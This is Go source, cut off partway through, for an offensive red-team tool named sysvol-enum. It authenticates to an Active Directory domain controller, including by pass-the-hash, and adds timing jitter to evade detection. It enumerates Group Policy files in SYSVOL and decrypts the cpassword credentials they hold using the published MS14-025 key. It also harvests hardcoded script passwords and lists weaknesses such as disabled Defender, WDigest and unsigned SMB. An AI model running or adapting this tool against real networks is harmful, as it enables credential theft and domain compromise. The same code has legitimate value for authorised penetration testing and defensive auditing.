// sysvol-enum — SYSVOL Enumerator
//
// Pure Go implementation using github.com/mandiant/gopacket.
// No Python, no impacket, no monkey-patching.
// Compile to a single static binary, drop and run.
//
// Build:
//   go build -trimpath -ldflags="-s -w" -o sysvol-enum .
//
// Cross-compile Windows .exe from Linux:
//   GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o sysvol-enum.exe .
//
// Usage:
//   ./sysvol-enum -u jsmith -p 'Password1' -d corp.local dc01.corp.local
//   ./sysvol-enum -u jsmith -H aad3b435:fc525c9... -d corp.local dc01 -o out.json
//   ./sysvol-enum -u jsmith -p 'P@ss' -d corp.local dc01 -proxy socks5h://127.0.0.1:1080

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	gsmb    "github.com/mandiant/gopacket/pkg/smb"
	gldap   "github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/session"
)

// ─────────────────────────────────────────────────────────────
// Colours
// ─────────────────────────────────────────────────────────────

const (
	cReset  = "\033[0m"
	cBold   = "\033[1m"
	cGrey   = "\033[90m"
	cWhite  = "\033[97m"
	cCyan   = "\033[36m"
	cGreen  = "\033[32m"
	cLime   = "\033[38;5;118m"
	cPurple = "\033[38;5;135m"
	cRed    = "\033[31m"
	cYel    = "\033[33m"
)

const banner = cLime + cBold + `
  ╔════════════════════════════════════════════════════════════════════════╗
  ║  ███████╗██╗   ██╗███████╗██╗   ██╗ ██████╗ ██╗                      ║
  ║  ██╔════╝╚██╗ ██╔╝██╔════╝╚██╗ ██╔╝██╔═══██╗██║                      ║
  ║  ███████╗ ╚████╔╝ ███████╗ ╚████╔╝ ██║   ██║██║                      ║
  ║  ╚════██║  ╚██╔╝  ╚════██║  ╚██╔╝  ██║   ██║██║                      ║
  ║  ███████║   ██║   ███████║   ██║   ╚██████╔╝███████╗                  ║
  ║  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝                  ║
  ║` + cReset + cPurple + `  SYSVOL Enumerator  //  red team use only                          ` + cLime + cBold + `║
  ╚════════════════════════════════════════════════════════════════════════╝` + cReset + "\n"

func info(f string, a ...any) { fmt.Printf(cLime+"[*]"+cReset+" "+f+"\n", a...) }
func good(f string, a ...any) { fmt.Printf(cLime+"[+]"+cReset+" "+f+"\n", a...) }
func warn(f string, a ...any) { fmt.Printf(cYel+"[!]"+cReset+" "+f+"\n", a...) }
func crit(f string, a ...any) { fmt.Printf(cRed+"[!!]"+cReset+" "+cBold+f+cReset+"\n", a...) }

func header(title string) {
	line := strings.Repeat("─", 60)
	fmt.Printf("%s%s%s\n", cBold+cWhite, line, cReset)
	fmt.Printf("  %s%s%s\n", cBold+cWhite, title, cReset)
	fmt.Printf("%s%s%s\n\n", cBold+cWhite, line, cReset)
}

func section(title string) {
	fmt.Printf("%s[ %s ]%s\n", cBold, title, cReset)
}

// ─────────────────────────────────────────────────────────────
// CLI options
// ─────────────────────────────────────────────────────────────

type opts struct {
	DC           string
	DCIP         string
	Domain       string
	TargetDomain string // domain to walk in SYSVOL/LDAP (defaults to Domain)
	Username     string
	Password     string
	Hashes       string // LM:NT
	Kerberos     bool
	Proxy        string
	Outfile      string
	Policy       string // target a single GPO by GUID or display name
	All          bool
	Verbose      bool
}

// sysvol returns the domain used for SYSVOL path and LDAP base DN.
func (o *opts) sysvol() string {
	if o.TargetDomain != "" {
		return o.TargetDomain
	}
	return o.Domain
}

func parseArgs() opts {
	var o opts
	flag.StringVar(&o.Domain,       "d",             "",    "Auth domain (e.g. corp.local)")
	flag.StringVar(&o.TargetDomain, "target-domain", "",    "SYSVOL/LDAP domain if different from auth domain (cross-domain)")
	flag.StringVar(&o.Username,     "u",             "",    "Username")
	flag.StringVar(&o.Password,     "p",             "",    "Password")
	flag.StringVar(&o.Hashes,       "H",             "",    "LM:NT hashes (pass-the-hash)")
	flag.BoolVar  (&o.Kerberos,     "k",             false, "Use Kerberos (KRB5CCNAME must be set)")
	flag.StringVar(&o.DCIP,         "dc-ip",         "",    "DC IP (if DC arg is a hostname)")
	flag.StringVar(&o.Proxy,        "proxy",         "",    "SOCKS5 proxy (e.g. socks5h://127.0.0.1:1080)")
	flag.StringVar(&o.Outfile,      "o",             "",    "Output directory (default: sysvol_YYYYMMDD_HHMMSS)")
	flag.StringVar(&o.Policy,       "policy",        "",    "Enumerate only this GPO (GUID or display name, case-insensitive)")
	flag.BoolVar  (&o.All,          "all",           false, "Show GPOs with no findings")
	flag.BoolVar  (&o.Verbose,      "v",             false, "Verbose output")
	flag.Parse()
	if flag.NArg() < 1 || o.Domain == "" || o.Username == "" {
		fmt.Fprintln(os.Stderr, "usage: sysvol-enum -u USER -p PASS -d DOMAIN [-target-domain DOMAIN] [-H LM:NT] [-k] [-dc-ip IP] [-proxy URL] [-o FILE] [-policy NAME|GUID] [-all] [-v] <DC>")
		os.Exit(1)
	}
	o.DC = flag.Arg(0)
	if o.DCIP == "" {
		o.DCIP = o.DC
	}
	return o
}

func (o *opts) lmHash() string {
	if o.Hashes == "" { return "" }
	p := strings.SplitN(o.Hashes, ":", 2)
	return p[0]
}
func (o *opts) ntHash() string {
	if o.Hashes == "" { return "" }
	p := strings.SplitN(o.Hashes, ":", 2)
	if len(p) < 2 { return "" }
	return p[1]
}

// ─────────────────────────────────────────────────────────────
// Jitter — crypto/rand based, no predictable sleep patterns
// ─────────────────────────────────────────────────────────────

func jitter() {
	n, _ := rand.Int(rand.Reader, big.NewInt(300))
	time.Sleep(time.Duration(50+n.Int64()) * time.Millisecond)
}

// ─────────────────────────────────────────────────────────────
// SMB transport via gopacket/pkg/smb
// ─────────────────────────────────────────────────────────────

// smbSession wraps a connected gopacket SMB client with SYSVOL mounted.
type smbSession struct {
	client *gsmb.Client
}

func connectSMB(o opts) (*smbSession, error) {
	target := session.Target{
		Host: o.DC,
		IP:   o.DCIP,
		Port: 445,
	}
	creds := session.Credentials{
		Domain:      o.Domain,
		Username:    o.Username,
		Password:    o.Password,
		Hash:        o.Hashes,
		UseKerberos: o.Kerberos,
		DCIP:        o.DCIP,
	}

	client := gsmb.NewClient(target, &creds)
	if err := client.Connect(); err != nil {
		return nil, fmt.Errorf("smb connect: %w", err)
	}
	if err := client.UseShare("SYSVOL"); err != nil {
		client.Close()
		return nil, fmt.Errorf("mount SYSVOL: %w", err)
	}
	return &smbSession{client: client}, nil
}

// listDir returns os.FileInfo entries under path on the share.
func (s *smbSession) listDir(path string) ([]os.FileInfo, error) {
	return s.client.Ls(path)
}

// readFile reads a file from the share and returns its bytes.
func (s *smbSession) readFile(path string) ([]byte, error) {
	content, err := s.client.Cat(path)
	if err != nil {
		return nil, err
	}
	return []byte(content), nil
}

func (s *smbSession) close() {
	s.client.Close()
}

// ─────────────────────────────────────────────────────────────
// LDAP transport via gopacket/pkg/ldap
// ─────────────────────────────────────────────────────────────

type ldapConn struct {
	conn   *gldap.Client
	baseDN string
}

func connectLDAP(o opts) (*ldapConn, error) {
	baseDN := "DC=" + strings.Join(strings.Split(o.sysvol(), "."), ",DC=")

	target := session.Target{
		Host: o.DC,
		IP:   o.DCIP,
		Port: 389,
	}
	creds := session.Credentials{
		Domain:      o.Domain,
		Username:    o.Username,
		Password:    o.Password,
		Hash:        o.Hashes,
		UseKerberos: o.Kerberos,
		DCIP:        o.DCIP,
	}

	conn := gldap.NewClient(target, &creds)
	if err := conn.Connect(false); err != nil {
		return nil, fmt.Errorf("ldap connect: %w", err)
	}

	var authErr error
	if o.Kerberos {
		authErr = conn.LoginWithKerberos()
	} else if o.Hashes != "" {
		authErr = conn.LoginWithHash()
	} else {
		// Use UPN format for simple bind — FQDN\user fails on some DCs
		authErr = conn.LoginWithUser(o.Username + "@" + o.Domain)
	}
	if authErr != nil {
		conn.Close()
		return nil, fmt.Errorf("ldap auth: %w", authErr)
	}
	return &ldapConn{conn: conn, baseDN: baseDN}, nil
}

// ─────────────────────────────────────────────────────────────
// LDAP GPO queries
// ─────────────────────────────────────────────────────────────

type gpoMeta struct {
	DisplayName string
	Flags       string
	Version     string
}

// getGPONames queries LDAP for all GPO display names, keyed by lowercase GUID.
func getGPONames(lc *ldapConn) (map[string]gpoMeta, error) {
	out := map[string]gpoMeta{}

	searchBase := "CN=Policies,CN=System," + lc.baseDN
	results, err := lc.conn.Search(searchBase,
		"(objectClass=groupPolicyContainer)",
		[]string{"cn", "displayName", "flags", "versionNumber"},
	)
	if err != nil {
		return out, err
	}

	for _, entry := range results.Entries {
		guid := strings.ToLower(strings.Trim(entry.GetAttributeValue("cn"), "{}"))
		out[guid] = gpoMeta{
			DisplayName: entry.GetAttributeValue("displayName"),
			Flags:       entry.GetAttributeValue("flags"),
			Version:     entry.GetAttributeValue("versionNumber"),
		}
	}
	return out, nil
}

// getGPOLinks returns a map of GUID → slice of linked OU DNs.
func getGPOLinks(lc *ldapConn) (map[string][]string, error) {
	out := map[string][]string{}

	results, err := lc.conn.Search(lc.baseDN,
		"(gPLink=*)",
		[]string{"distinguishedName", "gPLink"},
	)
	if err != nil {
		return out, err
	}

	re := regexp.MustCompile(`\{([0-9a-fA-F\-]+)\}`)
	for _, entry := range results.Entries {
		ouDN   := entry.DN
		gPLink := entry.GetAttributeValue("gPLink")
		for _, m := range re.FindAllStringSubmatch(gPLink, -1) {
			guid := strings.ToLower(m[1])
			out[guid] = append(out[guid], ouDN)
		}
	}
	return out, nil
}

// ─────────────────────────────────────────────────────────────
// Finding model
// ─────────────────────────────────────────────────────────────

type Finding struct {
	Severity    string `json:"severity"`
	Description string `json:"description"`
	Detail      string `json:"detail"`
	File        string `json:"file"`
	FileLabel   string `json:"file_label"`
	Decrypted   string `json:"decrypted,omitempty"`
}

type GPOResult struct {
	GUID        string    `json:"guid"`
	DisplayName string    `json:"display_name"`
	Flags       string    `json:"flags"`
	Version     string    `json:"version"`
	Path        string    `json:"path"`
	Links       []string  `json:"links"`
	Files       []string  `json:"files"`
	Findings    []Finding `json:"findings"`
}

// ─────────────────────────────────────────────────────────────
// cPassword decryptor — MS14-025 (AES-256-CBC, published key)
// ─────────────────────────────────────────────────────────────

// hex string → []byte helper (called at init)
func mustHex(s string) []byte {
	b := make([]byte, len(s)/2)
	for i := range b {
		fmt.Sscanf(s[i*2:i*2+2], "%02x", &b[i])
	}
	return b
}

var ms14025Key = mustHex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")

func decryptCPassword(cpass string) string {
	// Pad base64 to multiple of 4
	pad := (4 - len(cpass)%4) % 4
	raw, err := base64.StdEncoding.DecodeString(cpass + strings.Repeat("=", pad))
	if err != nil {
		return fmt.Sprintf("[base64 decode error: %v]", err)
	}
	block, err := aes.NewCipher(ms14025Key)
	if err != nil {
		return fmt.Sprintf("[aes init error: %v]", err)
	}
	if len(raw)%aes.BlockSize != 0 {
		return "[invalid ciphertext length]"
	}
	iv := make([]byte, aes.BlockSize) // 16 zero bytes
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(raw, raw)
	// Decode UTF-16LE and strip nulls
	return decodeUTF16LE(bytes.TrimRight(raw, "\x00"))
}

func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	runes := utf16.Decode(u16)
	return string(runes)
}

// ─────────────────────────────────────────────────────────────
// GptTmpl.inf parser
// ─────────────────────────────────────────────────────────────

func parseGptTmpl(data []byte) []Finding {
	var findings []Finding

	// Handle UTF-16 LE BOM
	text := ""
	if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		text = decodeUTF16LE(data[2:])
	} else {
		text = string(data)
	}

	section := ""
	for _, rawLine := range strings.Split(text, "\n") {
		line := strings.TrimSpace(rawLine)
		if strings.HasPrefix(line, "[") {
			section = strings.Trim(line, "[]")
			continue
		}
		if !strings.Contains(line, "=") {
			continue
		}
		k, v, _ := strings.Cut(line, "=")
		k, v = strings.TrimSpace(k), strings.TrimSpace(v)
		kl := strings.ToLower(k)

		switch {
		case kl == "autoadminlogon" && v == "1":
			findings = append(findings, Finding{Severity: "CRITICAL", Description: "AutoAdminLogon enabled", Detail: line})
		case kl == "defaultpassword":
			findings = append(findings, Finding{Severity: "CRITICAL", Description: "AutoLogon plaintext password", Detail: k + "=" + v})
		case kl == "defaultusername":
			findings = append(findings, Finding{Severity: "HIGH", Description: "AutoLogon username set", Detail: k + "=" + v})
		case kl == "minimumpasswordlength":
			if n := atoi(v); n > 0 && n < 12 {
				findings = append(findings, Finding{Severity: "MEDIUM", Description: fmt.Sprintf("Weak min password length: %d", n), Detail: line})
			}
		case kl == "passwordcomplexity" && v == "0":
			findings = append(findings, Finding{Severity: "HIGH", Description: "Password complexity disabled", Detail: line})
		case kl == "lockoutbadcount" && v == "0":
			findings = append(findings, Finding{Severity: "HIGH", Description: "Account lockout disabled", Detail: line})
		case section == "Privilege Rights" && isInterestingPrivilege(k):
			findings = append(findings, Finding{Severity: "INFO", Description: fmt.Sprintf("[%s] %s", section, k), Detail: line})
		}
	}
	return findings
}

func isInterestingPrivilege(k string) bool {
	interesting := []string{
		"SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeTakeOwnershipPrivilege",
		"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
		"SeBackupPrivilege", "SeRestorePrivilege", "SeTcbPrivilege",
	}
	for _, p := range interesting {
		if strings.EqualFold(k, p) {
			return true
		}
	}
	return false
}

// ─────────────────────────────────────────────────────────────
// Registry.pol parser (PReg format)
// ─────────────────────────────────────────────────────────────

type regEntry struct {
	Key     string
	Value   string
	RegType uint32
	Data    string
}

var interestingRegPatterns = []string{
	"autoadminlogon", "defaultpassword", "defaultusername",
	"winrm", "wdigest", "lsass",
	"disableantispyware", "disablerealtimemonitoring",
}

func parseRegistryPol(data []byte) []Finding {
	var findings []Finding
	entries := parseRegEntries(data)
	for _, e := range entries {
		combined := strings.ToLower(e.Key + e.Value)
		for _, pat := range interestingRegPatterns {
			if strings.Contains(combined, pat) {
				findings = append(findings, Finding{
					Severity:    "MEDIUM",
					Description: "Registry.pol interesting entry",
					Detail:      fmt.Sprintf("%s\\%s = %s", e.Key, e.Value, e.Data),
				})
				break
			}
		}
	}
	return findings
}

func parseRegEntries(data []byte) []regEntry {
	var entries []regEntry
	if len(data) < 8 {
		return entries
	}
	// Magic: PReg (50 52 65 67)
	if !bytes.Equal(data[:4], []byte{0x50, 0x52, 0x65, 0x67}) {
		return entries
	}
	off := 8 // skip magic + version
	for off+2 < len(data) {
		if data[off] != 0x5b || data[off+1] != 0x00 { // L"["
			break
		}
		off += 2
		key, o := readPolWStr(data, off)
		off = o + 2 // skip L";"
		val, o := readPolWStr(data, off)
		off = o + 2 // skip L";"
		if off+4 > len(data) {
			break
		}
		regType := binary.LittleEndian.Uint32(data[off:])
		off += 4 + 2 // skip L";"
		if off+4 > len(data) {
			break
		}
		size := int(binary.LittleEndian.Uint32(data[off:]))
		off += 4 + 2 // skip L";"
		if off+size > len(data) {
			break
		}
		raw := data[off : off+size]
		off += size + 2 // skip L"]"

		decoded := ""
		switch regType {
		case 4: // REG_DWORD
			if len(raw) >= 4 {
				decoded = fmt.Sprintf("%d", binary.LittleEndian.Uint32(raw))
			}
		case 1, 2: // REG_SZ, REG_EXPAND_SZ
			decoded = decodeUTF16LE(bytes.TrimRight(raw, "\x00"))
		default:
			decoded = fmt.Sprintf("[hex:%x]", raw)
		}
		entries = append(entries, regEntry{Key: key, Value: val, RegType: regType, Data: decoded})
	}
	return entries
}

func readPolWStr(data []byte, off int) (string, int) {
	var u16 []uint16
	for off+1 < len(data) {
		ch := binary.LittleEndian.Uint16(data[off:])
		off += 2
		if ch == 0x0000 {
			break
		}
		u16 = append(u16, ch)
	}
	return string(utf16.Decode(u16)), off
}

// ─────────────────────────────────────────────────────────────
// Groups.xml parser — MS14-025
// ─────────────────────────────────────────────────────────────

type groupsXML struct {
	XMLName xml.Name    `xml:"Groups"`
	Users   []groupUser `xml:"User"`
}
type groupUser struct {
	Properties groupUserProps `xml:"Properties"`
}
type groupUserProps struct {
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
	Action    string `xml:"action,attr"`
}

func parseGroupsXML(data []byte) []Finding {
	var findings []Finding
	var root groupsXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, u := range root.Users {
		p := u.Properties
		if p.CPassword != "" {
			dec := decryptCPassword(p.CPassword)
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword (MS14-025) — Groups.xml",
				Detail:      fmt.Sprintf("username=%s cpassword=%s", p.UserName, p.CPassword),
				Decrypted:   dec,
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// Drives.xml parser
// ─────────────────────────────────────────────────────────────

type drivesXML struct {
	XMLName xml.Name    `xml:"Drives"`
	Drives  []driveItem `xml:"Drive"`
}
type driveItem struct {
	Properties driveProps `xml:"Properties"`
}
type driveProps struct {
	Path      string `xml:"path,attr"`
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
}

func parseDrivesXML(data []byte) []Finding {
	var findings []Finding
	var root drivesXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, d := range root.Drives {
		p := d.Properties
		if p.CPassword != "" {
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword in Drives.xml (mapped drive creds)",
				Detail:      fmt.Sprintf("path=%s user=%s cpassword=%s", p.Path, p.UserName, p.CPassword),
				Decrypted:   decryptCPassword(p.CPassword),
			})
		} else if p.UserName != "" {
			findings = append(findings, Finding{
				Severity:    "INFO",
				Description: "Mapped drive with username (no cpassword)",
				Detail:      fmt.Sprintf("path=%s user=%s", p.Path, p.UserName),
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// ScheduledTasks.xml parser
// ─────────────────────────────────────────────────────────────

type scheduledTasksXML struct {
	XMLName xml.Name        `xml:"ScheduledTasks"`
	Tasks   []scheduledTask `xml:"Task"`
}
type scheduledTask struct {
	Properties taskProps `xml:"Properties"`
}
type taskProps struct {
	RunAs     string `xml:"runAs,attr"`
	CPassword string `xml:"cpassword,attr"`
	Command   string `xml:"appName,attr"`
}

func parseScheduledTasksXML(data []byte) []Finding {
	var findings []Finding
	var root scheduledTasksXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, t := range root.Tasks {
		p := t.Properties
		if p.CPassword != "" {
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword in ScheduledTasks.xml",
				Detail:      fmt.Sprintf("runAs=%s cpassword=%s", p.RunAs, p.CPassword),
				Decrypted:   decryptCPassword(p.CPassword),
			})
		}
		if p.Command != "" {
			cmdL := strings.ToLower(p.Command)
			for _, kw := range []string{"powershell", "cmd", "wscript", "cscript", "mshta", "rundll"} {
				if strings.Contains(cmdL, kw) {
					findings = append(findings, Finding{
						Severity:    "INFO",
						Description: "Scheduled task interesting command",
						Detail:      p.Command,
					})
					break
				}
			}
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// Script file credential scanner
// ─────────────────────────────────────────────────────────────

var scriptPatterns = []struct {
	re   *regexp.Regexp
	desc string
}{
	{regexp.MustCompile(`(?i)password\s*=\s*['"]?(\S+)`), "Hardcoded password in script"},
	{regexp.MustCompile(`(?i)-password\s+(\S+)`),          "Password flag in script"},
	{regexp.MustCompile(`(?i)net use.*password`),          "net use with password"},
	{regexp.MustCompile(`(?i)runas.*password`),            "runas with password"},
	{regexp.MustCompile(`(?i)ConvertTo-SecureString.*AsPlainText`), "Plaintext SecureString"},
}

func parseScript(path string, data []byte) []Finding {
	var findings []Finding
	text := string(data)
	for _, p := range scriptPatterns {
		for _, m := range p.re.FindAllString(text, -1) {
			findings = append(findings, Finding{
				Severity:    "HIGH",
				Description: p.desc,
				Detail:      fmt.Sprintf("%s: %s", path, truncate(m, 120)),
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// Registry.xml parser — Group Policy Preferences registry entries
// ─────────────────────────────────────────────────────────────

type registryXMLSettings struct {
	XMLName xml.Name          `xml:"RegistrySettings"`
	Items   []registryXMLItem `xml:"Registry"`
}
type registryXMLItem struct {
	Properties registryXMLProps `xml:"Properties"`
}
type registryXMLProps struct {
	Action string `xml:"action,attr"`
	Hive   string `xml:"hive,attr"`
	Key    string `xml:"key,attr"`
	Name   string `xml:"name,attr"`
	Type   string `xml:"type,attr"`
	Value  string `xml:"value,attr"`
}

func parseRegistryXML(data []byte) []Finding {
	var findings []Finding
	var root registryXMLSettings
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}

	for _, item := range root.Items {
		p := item.Properties
		fullKey  := strings.ToLower(p.Hive + `\` + p.Key)
		nameLow  := strings.ToLower(p.Name)
		valueLow := strings.ToLower(p.Value)
		detail   := fmt.Sprintf(`%s\%s\%s = %s [%s, action=%s]`, p.Hive, p.Key, p.Name, p.Value, p.Type, p.Action)

		var found *Finding

		// ── Credential indicators in value name ──────────────────
		for _, kw := range []string{"password", "passwd", "pwd", "secret", "credential", "apikey", "api_key", "token"} {
			if strings.Contains(nameLow, kw) {
				found = &Finding{Severity: "CRITICAL", Description: fmt.Sprintf("Registry.xml credential-named value: %s", p.Name)}
				break
			}
		}

		// ── AutoLogon ────────────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `winlogon`) {
			switch {
			case nameLow == "autoadminlogon" && p.Value == "1":
				found = &Finding{Severity: "CRITICAL", Description: "AutoAdminLogon enabled via GPP registry"}
			case nameLow == "defaultpassword":
				found = &Finding{Severity: "CRITICAL", Description: "AutoLogon plaintext password pushed via GPP"}
			case nameLow == "defaultusername":
				found = &Finding{Severity: "HIGH", Description: "AutoLogon username set via GPP"}
			}
		}

		// ── WDigest cleartext creds ──────────────────────────────
		if found == nil && strings.Contains(fullKey, `wdigest`) && nameLow == "uselogoncredential" && p.Value == "1" {
			found = &Finding{Severity: "CRITICAL", Description: "WDigest cleartext creds enabled (UseLogonCredential=1)"}
		}

		// ── AlwaysInstallElevated ────────────────────────────────
		if found == nil && nameLow == "alwaysinstallelevated" && p.Value == "1" {
			found = &Finding{Severity: "CRITICAL", Description: "AlwaysInstallElevated=1 — MSI local privesc"}
		}

		// ── LSA / NTLM settings ──────────────────────────────────
		if found == nil && strings.Contains(fullKey, `\lsa`) {
			switch {
			case nameLow == "runasppl" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "LSA Protection disabled (RunAsPPL=0)"}
			case nameLow == "lmcompatibilitylevel":
				if n := atoi(p.Value); n < 3 {
					found = &Finding{Severity: "HIGH", Description: fmt.Sprintf("NTLMv1 allowed (LmCompatibilityLevel=%d — needs ≥3 for NTLMv2 only)", n)}
				}
			case nameLow == "nolmhash" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "LM hash storage enabled (NoLMHash=0)"}
			case nameLow == "disablerestrictedadmin" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "RestrictedAdmin mode disabled — pass-the-hash to RDP possible"}
			case nameLow == "cachedlogonscount":
				n := atoi(p.Value)
				if n == 0 {
					found = &Finding{Severity: "INFO", Description: "Domain credential caching disabled (CachedLogonsCount=0)"}
				} else {
					found = &Finding{Severity: "INFO", Description: fmt.Sprintf("Domain credential cache count: %s", p.Value)}
				}
			case nameLow == "everyoneincludesanonymous" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "Anonymous access — Everyone includes anonymous"}
			case nameLow == "restrictnullsessaccess" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "Null session access allowed (RestrictNullSessAccess=0)"}
			}
		}

		// ── Defender / AV disabled ───────────────────────────────
		if found == nil && strings.Contains(fullKey, `windows defender`) {
			switch nameLow {
			case "disableantispyware":
				if p.Value == "1" {
					found = &Finding{Severity: "HIGH", Description: "Windows Defender disabled (DisableAntiSpyware=1)"}
				}
			case "disablerealtimemonitoring":
				if p.Value == "1" {
					found = &Finding{Severity: "HIGH", Description: "Defender real-time monitoring disabled"}
				}
			case "disablebehaviormonitoring":
				if p.Value == "1" {
					found = &Finding{Severity: "HIGH", Description: "Defender behavior monitoring disabled"}
				}
			case "disableioavprotection":
				if p.Value == "1" {
					found = &Finding{Severity: "HIGH", Description: "Defender IOAV protection disabled"}
				}
			case "disablescriptscanning":
				if p.Value == "1" {
					found = &Finding{Severity: "HIGH", Description: "Defender script scanning disabled"}
				}
			}
		}

		// ── UAC weakening ────────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `policies\system`) {
			switch {
			case nameLow == "enablelua" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "UAC disabled (EnableLUA=0)"}
			case nameLow == "consentpromptbehavioradmin" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "UAC admin consent prompt suppressed (ConsentPromptBehaviorAdmin=0)"}
			case nameLow == "localaccounttokenfilterpolicy" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "LocalAccountTokenFilterPolicy=1 — remote admin token not stripped (PtH pivot)"}
			case nameLow == "filteradministratortoken" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "Built-in Administrator token not filtered for UAC"}
			}
		}

		// ── WinRM ────────────────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `winrm`) {
			switch {
			case nameLow == "allowunencryptedtraffic" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "WinRM allows unencrypted traffic"}
			case nameLow == "allownegotiate" && p.Value == "1":
				found = &Finding{Severity: "MEDIUM", Description: "WinRM allows Negotiate (NTLM) auth"}
			case nameLow == "allowbasicauthentication" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "WinRM allows Basic auth (cleartext credentials)"}
			}
		}

		// ── RDP ──────────────────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `terminal server`) {
			switch {
			case nameLow == "fdenytsconnections" && p.Value == "0":
				found = &Finding{Severity: "MEDIUM", Description: "RDP enabled (fDenyTSConnections=0)"}
			case nameLow == "userpasswordenabled" && p.Value == "1":
				found = &Finding{Severity: "HIGH", Description: "RDP saved password enabled"}
			case nameLow == "disablepasswordsaving" && p.Value == "0":
				found = &Finding{Severity: "MEDIUM", Description: "RDP password saving allowed"}
			}
		}

		// ── SMB signing ──────────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `lanmanserver\parameters`) {
			switch {
			case nameLow == "requiresecuritysignature" && p.Value == "0":
				found = &Finding{Severity: "HIGH", Description: "SMB signing not required (server-side) — relay attacks viable"}
			case nameLow == "enablesecuritysignature" && p.Value == "0":
				found = &Finding{Severity: "MEDIUM", Description: "SMB signing disabled on server"}
			}
		}
		if found == nil && strings.Contains(fullKey, `lanmanworkstation\parameters`) {
			if nameLow == "requiresecuritysignature" && p.Value == "0" {
				found = &Finding{Severity: "HIGH", Description: "SMB signing not required on client — relay attacks viable"}
			}
		}

		// ── PowerShell execution policy ──────────────────────────
		if found == nil && strings.Contains(fullKey, `powershell`) && nameLow == "executionpolicy" {
			switch valueLow {
			case "bypass", "unrestricted":
				found = &Finding{Severity: "MEDIUM", Description: fmt.Sprintf("PowerShell execution policy: %s", p.Value)}
			case "remotesigned":
				found = &Finding{Severity: "INFO", Description: "PowerShell execution policy: RemoteSigned"}
			}
		}

		// ── Firewall disabled ────────────────────────────────────
		if found == nil && strings.Contains(fullKey, `firewall`) {
			if nameLow == "enablefirewall" && p.Value == "0" {
				found = &Finding{Severity: "HIGH", Description: "Windows Firewall disabled via GPP"}
			}
		}

		// ── Run / RunOnce persistence keys ───────────────────────
		if found == nil {
			keyParts := strings.ToLower(p.Key)
			if strings.HasSuffix(keyParts, `\run`) || strings.HasSuffix(keyParts, `\runonce`) ||
				strings.Contains(keyParts, `\run\`) {
				found = &Finding{Severity: "INFO", Description: fmt.Sprintf("GPP run key entry: %s → %s", p.Name, truncate(p.Value, 80))}
			}
		}

		// ── Credential in value data (fallback) ──────────────────
		if found == nil && len(p.Value) > 6 && len(p.Value) < 512 {
			for _, kw := range []string{"password", "passwd", "secret"} {
				if strings.Contains(valueLow, kw) {
					found = &Finding{Severity: "HIGH", Description: fmt.Sprintf("Possible credential in registry value data: %s", p.Name)}
					break
				}
			}
		}

		if found != nil {
			found.Detail = detail
			findings = append(findings, *found)
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// SYSVOL walker
// ─────────────────────────────────────────────────────────────

var interestingFiles = map[string]struct {
	Label  string
	Parser func([]byte) []Finding
}{
	"groups.xml":         {"Groups / Local Admins (MS14-025)", parseGroupsXML},
	"drives.xml":         {"Mapped Drives",                    parseDrivesXML},
	"scheduledtasks.xml": {"Scheduled Tasks",                  parseScheduledTasksXML},
	"registry.xml":       {"Registry Preferences (GPP)",       parseRegistryXML},
	"registry.pol":       {"Registry Policy",                  parseRegistryPol},
	"gpttmpl.inf":        {"Security Template",                parseGptTmpl},
}

var scriptExts = map[string]bool{
	".ps1": true, ".bat": true, ".cmd": true, ".vbs": true, ".js": true,
}

func walkGPO(smbs *smbSession, gpoPath, guid string, meta gpoMeta, links []string, verbose bool) GPOResult {
	result := GPOResult{
		GUID:        guid,
		DisplayName: meta.DisplayName,
		Flags:       meta.Flags,
		Version:     meta.Version,
		Path:        gpoPath,
		Links:       links,
	}
	if result.DisplayName == "" {
		result.DisplayName = "{GPO-" + guid + "}"
